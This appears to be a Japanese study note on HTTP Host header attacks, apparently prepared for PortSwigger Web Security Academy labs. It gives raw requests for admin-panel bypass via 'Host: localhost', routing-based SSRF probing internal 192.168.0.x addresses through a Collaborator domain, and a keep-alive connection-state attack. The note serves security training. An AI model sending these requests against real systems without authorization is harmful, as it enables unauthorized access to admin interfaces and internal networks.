###### 基本：認証のバイパス

```http
GET /admin HTTP/1.1
Host: localhost
```

#### Password reset poisoning

- [[Password reset poisoning#攻撃手法]]

---
#### & Web cache poisoning

- "Unkey"がHostヘッダであることを悪用[[⚡️Web cache poisoning#& Host header attack]]

---
#### & Routing-based SSRF

1. Collaboratorにルーティング(LB等により振り分け)されるか確認する
```http
GET /admin HTTP/1.1
Host: COLLABORATOR_DOMAIN
```
```http
GET https://TARGET_NET/admin HTTP/1.1
Host: COLLABORATOR_DOMAIN
```
2. [[🔍SSRF#②内部ファイルを探す]]
	- ==⚠️=="Update Host header to match target"の☑️を外すこと
	- [[2.  一般的なSSRF防御の回避#SSRF ブラックリスト回避]]
3. 悪用
```http
GET /admin HTTP/1.1
Host: 192.168.0.x
```
```http
GET https://TARGET_NET/admin HTTP/1.1
Host: 192.168.0.x
```

もし`HTTP/1.1 301 Moved Permanently`などでうまくいかないときは↓

---
#### Connection state attack

1. `Connection:keep-alive`へ変更
```http
GET / HTTP/1.1
Host: TARGET_NET
...
Connection: keep-alive
```
2. 目的のリクエスト
```http
GET /admin HTTP/1.1
Host: localhost
```
3. 1, 2の順でGroup化し、Send group in sequence(single connection)

- [LAB](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)

